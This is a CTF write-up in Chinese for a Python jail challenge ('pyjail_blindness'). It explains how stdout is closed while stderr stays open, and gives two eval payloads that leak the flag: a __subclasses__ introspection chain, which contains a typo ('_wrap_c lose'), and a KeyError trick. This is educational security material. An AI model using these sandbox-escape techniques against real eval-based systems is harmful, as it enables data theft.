---
title: pyjail_blindness
tags: [pythonjail, CTF]

---

```
#!/usr/local/bin/python3
import sys
inp = input('blindness > ')
sys.stdout.close()
flag = open('flag.txt').read()
eval(inp, {'builtins': {}, 'flag': flag})
print('bye bye')
```
```
sys.stdout.close()
```
關閉了標準輸出 (standard output)。這意味著在這行之後，任何正常的 print() 函式都無法將訊息顯示在終端機上

```
eval(inp, {'builtins': {}, 'flag': flag})
```
eval()：這是一個 Python 的內建函式，它可以解析並執行以字串形式傳入的 Python 運算式。a
inp：這是使用者輸入的字串，eval 會試圖執行它。

程式碼中 sys.stdout.close() 只關閉了標準輸出。這意味著正常的 print() 函數無法顯示任何東西。然而，當 Python 程式發生錯誤時，它的錯誤追蹤訊息 (Traceback) 和錯誤提示是寫入到標準錯誤 (stderr) 中的，而這個管道仍然是開啟的。
**引發一個會把 flag 內容顯示在錯誤訊息中的異常 (Exception) 即可**

## Introspection
Introspection (內省) 就是指程式在執行期間 (runtime)，有能力去檢查自己或其他物件的「內部結構」和「狀態」
* type()
* dir()
* hasattr()
* getattr()
```
>>> my_variable = "Hello World"
>>> type(my_variable)
<class 'str'> 
```

在 Python 中，那些用雙底線 __ 包起來的屬性或方法 (我們暱稱為 "Dunder"，是 Double Underscore 的縮寫) 通常是 Python 內部的鉤子或屬性。
* __ class__：取得物件的類別。
* __ base__：取得一個類別的父類別。
* __ subclasses__()：取得一個類別的所有子類別。
* __ dict__：用字典的形式顯示一個物件的所有屬性。
* __ globals__：取得一個函式所在的模組的全域變數。

提供兩種解法
## Playload
```
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_c lose'][0].__init__.__globals__['sys'].stderr.write(flag)
```
![image](https://hackmd.io/_uploads/rJml-qX6ge.png)

## Playload
```
{}[flag]
```
當 eval() 函數執行這個輸入時，會發生以下事情：
* Python 看到 {} [flag] 這個運算式。它會先分別計算 [] 左右兩邊的東西。
這不是字串 'flag'，而是變數 flag。Python 會去查找這個變數的值。它找到了！值就是我們假設的 
```
{}['jail{this_is_a_secret}']
```
* 在那個空的字典裡，找出鍵 (key) 為 'jail{this_is_a_secret}' 的值 (value)
* KeyError找不到鍵，`KeyError: 'jail{this_is_a_secret}'
`發送到開啟的標準錯誤 (stderr)
![image](https://hackmd.io/_uploads/rym16DQTeg.png)
